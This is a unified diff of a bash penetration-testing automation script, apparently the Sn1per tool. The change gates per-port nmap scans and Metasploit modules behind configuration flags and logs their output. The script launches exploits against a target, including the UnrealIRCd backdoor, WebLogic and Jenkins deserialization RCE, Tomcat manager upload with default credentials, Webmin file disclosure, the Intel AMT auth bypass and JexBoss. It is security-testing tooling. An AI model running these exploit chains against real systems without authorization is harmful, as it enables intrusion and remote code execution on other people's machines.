+    nmap -A -sV -Pn -T5 --script=vnc* -p 5800 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port5800.txt
+  fi
 fi
 
 if [ -z "$port_5900" ];
@@ -860,14 +973,20 @@ then
   echo -e "$OKRED + -- --=[Port 5900 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 5900 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV  -T5 --script=vnc* -p 5900 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; setg RHOSTS \"$TARGET\"; run; back; exit;"
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV  -T5 --script=vnc* -p 5900 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port5900.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; setg RHOSTS \"$TARGET\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port5900-vnc_none_auth.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port5900-vnc_none_auth.raw > $LOOT_DIR/output/msf-$TARGET-port5900-vnc_none_auth.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port5900-vnc_none_auth.raw 2> /dev/null
+  fi
 fi
 
 if [ -z "$port_5984" ];
@@ -875,14 +994,20 @@ then
   echo -e "$OKRED + -- --=[Port 5984 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 5984 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 --script=couchdb* -p 5984 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/couchdb/couchdb_enum; set RHOST "$TARGET"; run; exit;"
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV -Pn -T5 --script=couchdb* -p 5984 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port5984.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use auxiliary/scanner/couchdb/couchdb_enum; set RHOST "$TARGET"; run; exit;"| tee $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.raw > $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.raw 2> /dev/null
+  fi
 fi
 
 if [ -z "$port_6000" ];
@@ -890,14 +1015,20 @@ then
   echo -e "$OKRED + -- --=[Port 6000 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 6000 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 --script=x11* -p 6000 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/x11/open_x11; set RHOSTS "$TARGET"; exploit;"
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV -Pn -T5 --script=x11* -p 6000 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port6000.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use auxiliary/scanner/x11/open_x11; set RHOSTS "$TARGET"; exploit;" | tee $LOOT_DIR/output/msf-$TARGET-port6000-open_x11.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port6000-open_x11.raw > $LOOT_DIR/output/msf-$TARGET-port6000-open_x11.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port6000-open_x11.raw 2> /dev/null
+  fi
 fi
 
 if [ -z "$port_6667" ];
@@ -905,14 +1036,20 @@ then
   echo -e "$OKRED + -- --=[Port 6667 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 6667 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 --script=irc* -p 6667 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use unix/irc/unreal_ircd_3281_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV -Pn -T5 --script=irc* -p 6667 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port6667.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use unix/irc/unreal_ircd_3281_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port6667-unreal_ircd_3281_backdoor.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port6667-unreal_ircd_3281_backdoor.raw > $LOOT_DIR/output/msf-$TARGET-port6667-unreal_ircd_3281_backdoor.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port6667-unreal_ircd_3281_backdoor.raw 2> /dev/null
+  fi
 fi
 
 if [ -z "$port_7001" ];
@@ -920,203 +1057,23 @@ then
   echo -e "$OKRED + -- --=[Port 7001 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 7001 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -sV -p 7001 --script=weblogic-t3-info.nse $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use multi/http/oracle_weblogic_wsat_deserialization_rce; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set SSL true; run; exit;"
-  msfconsole -q -x "use exploit/linux/misc/jenkins_java_deserialize; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT 7001; set SSL true; run; exit;"
-fi
-
-if [ -z "$port_8000" ];
-then
-  echo -e "$OKRED + -- --=[Port 8000 closed... skipping.$RESET"
-else
-  echo -e "$OKORANGE + -- --=[Port 8000 opened... running tests...$RESET"
-  wafw00f http://$TARGET:8000
-  echo ""
-  whatweb -a 3 http://$TARGET:8000
-  echo ""
-  if [ ${DISTRO} == "blackarch"  ]; then
-    /bin/CutyCapt --url=http://$TARGET:8000 --out=$LOOT_DIR/screenshots/$TARGET-port8000.jpg --insecure --max-wait=1000 2> /dev/null
-  else
-    cutycapt --url=http://$TARGET:8000 --out=$LOOT_DIR/screenshots/$TARGET-port8000.jpg --insecure --max-wait=1000 2> /dev/null
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -sV -p 7001 --script=weblogic-t3-info.nse $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port7001.txt
   fi
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8000 -T5 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING JEXBOSS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  cd /tmp/
-  python /usr/share/sniper/plugins/jexboss/jexboss.py -u http://$TARGET:8000
-  cd $INSTALL_DIR
-fi
-
-if [ -z "$port_8100" ];
-then
-  echo -e "$OKRED + -- --=[Port 8100 closed... skipping.$RESET"
-else
-  echo -e "$OKORANGE + -- --=[Port 8100 opened... running tests...$RESET"
-  wafw00f http://$TARGET:8100
-  echo ""
-  whatweb -a 3 http://$TARGET:8100
-  echo ""
-  sslscan --no-failed $TARGET:8100
-  if [ ${DISTRO} == "blackarch"  ]; then
-    /bin/CutyCapt --url=http://$TARGET:8100 --out=$LOOT_DIR/screenshots/$TARGET-port8100.jpg --insecure --max-wait=1000 2> /dev/null
-  else
-    cutycapt --url=http://$TARGET:8100 --out=$LOOT_DIR/screenshots/$TARGET-port8100.jpg --insecure --max-wait=1000 2> /dev/null
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use multi/http/oracle_weblogic_wsat_deserialization_rce; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set SSL true; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port7001-oracle_weblogic_wsat_deserialization_rce.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port7001-oracle_weblogic_wsat_deserialization_rce.raw > $LOOT_DIR/output/msf-$TARGET-port7001-oracle_weblogic_wsat_deserialization_rce.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port7001-oracle_weblogic_wsat_deserialization_rce.raw 2> /dev/null
+    msfconsole -q -x "use exploit/linux/misc/jenkins_java_deserialize; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT 7001; set SSL true; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.raw > $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.raw 2> /dev/null
   fi
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8100 -T5 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING JEXBOSS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  cd /tmp/
-  python /usr/share/sniper/plugins/jexboss/jexboss.py -u http://$TARGET:8100
-  cd $INSTALL_DIR
-fi
-
-if [ -z "$port_8080" ];
-then
-  echo -e "$OKRED + -- --=[Port 8080 closed... skipping.$RESET"
-else
-  echo -e "$OKORANGE + -- --=[Port 8080 opened... running tests...$RESET"
-  wafw00f http://$TARGET:8080
-  echo ""
-  whatweb -a 3 http://$TARGET:8080
-  echo ""
-  sslscan --no-failed $TARGET:8080
-  if [ ${DISTRO} == "blackarch"  ]; then
-    /bin/CutyCapt --url=http://$TARGET:8080 --out=$LOOT_DIR/screenshots/$TARGET-port8080.jpg --insecure --max-wait=1000 2> /dev/null
-  else
-    cutycapt --url=http://$TARGET:8080 --out=$LOOT_DIR/screenshots/$TARGET-port8080.jpg --insecure --max-wait=1000 2> /dev/null
-  fi
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING APACHE STRUTS CVE-2017-5638 VULN SCAN $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8080 -T5 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING APACHE STRUTS 2 REST PLUGIN XSTREAM RCE VULN CHECK $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "${OKBLUE}[*] If you see a 200 response code below, try running 'msfconsole -q -x \"multi/http/struts2_rest_xstream; set RHOST \"$TARGET\"; exploit -j; exit;"
-  curl -I http://$TARGET:8080/struts2-rest-showcase/orders/3 -s | grep HTTP | grep 200
-  curl -I http://$TARGET:8080/struts2-showcase/integration/saveGangster.action -s | grep HTTP | grep 200 
-  echo -e "$OKRED RUNNING APACHE STRUTS JAKARTA RCE VULN CHECK $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "${OKBLUE}[*] If you see a 200 response code below, try running 'msfconsole -q -x \"multi/http/struts2_content_type_ognl; set RHOST \"$TARGET\"; exploit -j; exit;"
-  curl -I http://$TARGET:8080/struts2-showcase/ -s | grep HTTP | grep 200
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING APACHE TOMCAT EXPLOITS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use admin/http/jboss_bshdeployer; run; use auxiliary/scanner/http/jboss_status; run; use admin/http/tomcat_administration; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING WILDFLY TRAVERSAL EXPLOIT $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/http/wildfly_traversal; setg RHOSTS "$TARGET"; set RPORT 8080; run; back; exit;"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING JEXBOSS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  cd /tmp/
-  python /usr/share/sniper/plugins/jexboss/jexboss.py -u http://$TARGET:8080
-  cd $INSTALL_DIR
-fi
-
-if [ -z "$port_8180" ];
-then
-  echo -e "$OKRED + -- --=[Port 8180 closed... skipping.$RESET"
-else
-  echo -e "$OKORANGE + -- --=[Port 8180 opened... running tests...$RESET"
-  wafw00f http://$TARGET:8180
-  echo ""
-  whatweb -a 3 http://$TARGET:8180
-  echo ""
-  sslscan --no-failed $TARGET:8180
-  sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET:8180
-  if [ ${DISTRO} == "blackarch"  ]; then
-    /bin/CutyCapt --url=http://$TARGET:8180 --out=$LOOT_DIR/screenshots/$TARGET-port8180.jpg --insecure --max-wait=1000 2> /dev/null
-  else
-    cutycapt --url=http://$TARGET:8180 --out=$LOOT_DIR/screenshots/$TARGET-port8180.jpg --insecure --max-wait=1000 2> /dev/null
-  fi
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING CVE-2017-5638 EXPLOIT $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -p 8180 -T5 --script=*proxy* $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING WEBMIN FILE DISCLOSURE EXPLOIT $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNING APACHE TOMCAT EXPLOITS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8180; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING JEXBOSS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  cd /tmp/
-  python /usr/share/sniper/plugins/jexboss/jexboss.py -u http://$TARGET:8180
-  cd $INSTALL_DIR
-fi
-
-if [ -z "$port_8443" ];
-then
-  echo -e "$OKRED + -- --=[Port 8443 closed... skipping.$RESET"
-else
-  echo -e "$OKORANGE + -- --=[Port 8443 opened... running tests...$RESET"
-  wafw00f http://$TARGET:8443
-  echo ""
-  whatweb -a 3 http://$TARGET:8443
-  echo ""
-  sslscan --no-failed $TARGET:8443
-  sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET:8443
-  if [ ${DISTRO} == "blackarch"  ]; then
-    /bin/CutyCapt --url=https://$TARGET:8443 --out=$LOOT_DIR/screenshots/$TARGET-port8443.jpg --insecure --max-wait=1000 2> /dev/null
-  else
-    cutycapt --url=https://$TARGET:8443 --out=$LOOT_DIR/screenshots/$TARGET-port8443.jpg --insecure --max-wait=1000 2> /dev/null
-  fi
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING CVE-2017-5638 EXPLOIT $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8443 -T5 --script=*proxy* $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING JEXBOSS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  cd /tmp/
-  python /usr/share/sniper/plugins/jexboss/jexboss.py -u https://$TARGET:8443
-  cd $INSTALL_DIR
-fi
-
-if [ -z "$port_8888" ];
-then
-  echo -e "$OKRED + -- --=[Port 8888 closed... skipping.$RESET"
-else
-  echo -e "$OKORANGE + -- --=[Port 8888 opened... running tests...$RESET"
-  wafw00f http://$TARGET:8888
-  echo ""
-  whatweb -a 3 http://$TARGET:8888
-  echo ""
-  if [ ${DISTRO} == "blackarch"  ]; then
-    /bin/CutyCapt --url=https://$TARGET:8888 --out=$LOOT_DIR/screenshots/$TARGET-port8888.jpg --insecure --max-wait=1000 2> /dev/null
-  else
-    cutycapt --url=https://$TARGET:8888 --out=$LOOT_DIR/screenshots/$TARGET-port8888.jpg --insecure --max-wait=1000 2> /dev/null
-  fi
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING CVE-2017-5638 EXPLOIT $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse  -A -p 8888 -T5 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING JEXBOSS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  cd /tmp/
-  python /usr/share/sniper/plugins/jexboss/jexboss.py -u http://$TARGET:8888
-  cd $INSTALL_DIR
 fi
 
 if [ -z "$port_10000" ];
@@ -1124,10 +1081,14 @@ then
   echo -e "$OKRED + -- --=[Port 10000 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 10000 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING WEBMIN FILE DISCLOSURE EXPLOIT $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING WEBMIN FILE DISCLOSURE EXPLOIT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port10000-file_disclosure.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port10000-file_disclosure.raw > $LOOT_DIR/output/msf-$TARGET-port10000-file_disclosure.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port10000-file_disclosure.raw 2> /dev/null
+  fi
 fi
 
 if [ -z "$port_16992" ];
@@ -1135,18 +1096,14 @@ then
   echo -e "$OKRED + -- --=[Port 16992 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 16992 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING AMAP $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  amap $TARGET 16992 -A
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 16992 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING INTEL AMT AUTH BYPASS EXPLOIT $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/http/intel_amt_digest_bypass; setg RHOSTS \"$TARGET\"; run; back; exit;"
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING INTEL AMT AUTH BYPASS EXPLOIT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use auxiliary/scanner/http/intel_amt_digest_bypass; setg RHOSTS \"$TARGET\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port16992-intel_amt_digest_bypass.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port16992-intel_amt_digest_bypass.raw > $LOOT_DIR/output/msf-$TARGET-port16992-intel_amt_digest_bypass.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port16992-intel_amt_digest_bypass.raw 2> /dev/null
+  fi
 fi
 
 if [ -z "$port_27017" ];
@@ -1154,10 +1111,12 @@ then
   echo -e "$OKRED + -- --=[Port 27017 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 27017 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -sV -p 27017 -Pn -T5 --script=mongodb* $TARGET
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -sV -p 27017 -Pn -T5 --script=mongodb* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port27017.txt
+  fi
 fi
 
 if [ -z "$port_27018" ];
@@ -1165,10 +1124,12 @@ then
   echo -e "$OKRED + -- --=[Port 27018 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 27018 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -sV  -p 27018 -Pn -T5 --script=mongodb* $TARGET
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -sV  -p 27018 -Pn -T5 --script=mongodb* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port27018.txt
+  fi
 fi
 
 if [ -z "$port_27019" ];
@@ -1176,10 +1137,12 @@ then
   echo -e "$OKRED + -- --=[Port 27019 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 27019 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -sV  -p 27019 -Pn -T5 --script=mongodb* $TARGET
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -sV  -p 27019 -Pn -T5 --script=mongodb* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port27019.txt
+  fi
 fi
 
 if [ -z "$port_28017" ];
@@ -1187,63 +1150,42 @@ then
   echo -e "$OKRED + -- --=[Port 28017 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 28017 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -sV  -p 28017 -Pn -T5 --script=mongodb* $TARGET
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -sV  -p 28017 -Pn -T5 --script=mongodb* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port28017.txt
+  fi
 fi
 
-echo -e "${OKGREEN}====================================================================================${RESET}"
-echo -e "$OKRED SCANNING FOR COMMON VULNERABILITIES $RESET"
-echo -e "${OKGREEN}====================================================================================${RESET}"
-if [ ${DISTRO} == "blackarch" ]; then
-  /bin/yasuo -r $TARGET -b all | tee $LOOT_DIR/vulnerabilities/yasuo-$TARGET.txt 2> /dev/null
-else
-  cd $PLUGINS_DIR/yasuo
-  ruby yasuo.rb -r $TARGET -b all | tee $LOOT_DIR/vulnerabilities/yasuo-$TARGET.txt 2> /dev/null
+if [ $YASUO = "1" ]; then
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED SCANNING FOR COMMON VULNERABILITIES $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  if [ ${DISTRO} == "blackarch" ]; then
